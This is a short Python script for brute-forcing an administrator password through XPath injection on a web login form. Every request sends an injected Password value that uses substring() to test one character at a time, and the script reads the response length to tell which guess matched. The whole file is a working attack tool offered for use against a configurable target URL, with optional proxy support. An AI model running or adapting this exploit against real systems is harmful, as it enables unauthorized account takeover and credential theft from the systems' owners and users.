#This is a bruteforcer for Logins which are prone to XPATH vulns
#Made in order to work with python3

import requests, string, sys

url = "http://your.url/login.php" #enter the URL where you are logging in
# proxy = "http://your.proxy:3128"     #if a proxy is needed uncomment here
letters = string.ascii_letters + string.digits + '-' + '!' + '@' + '#' + '$' + '%' #the characters that should be contained / tested in the password
user = 'admin' #you guess it :)
pwlength = 20 #maximum password length to bruteforce
reqlength = 6756 #request length to ignore - the responses where we dont get a hit

######################################
####### no changes from here #########
######################################

pw = ''

loop=True
while loop:
   loop=False
   for i in range(1,pwlength):
      for l in letters:
         data = {"Username": '', "Password": "' or username= '" + user + "'or substring(Password,{},1)='{}' or'".format(str(i),l)}
         request = requests.post(url, data=data)
         #request = requests.post(url, data=data, proxies={'http':proxy}) => uncomment this if proxy is needed
         print(len(request.text))
         if user in request.text and len(request.text) != reqlength:
             pw=pw+l
             print("The Password for " +user +" is: "+pw)
             break
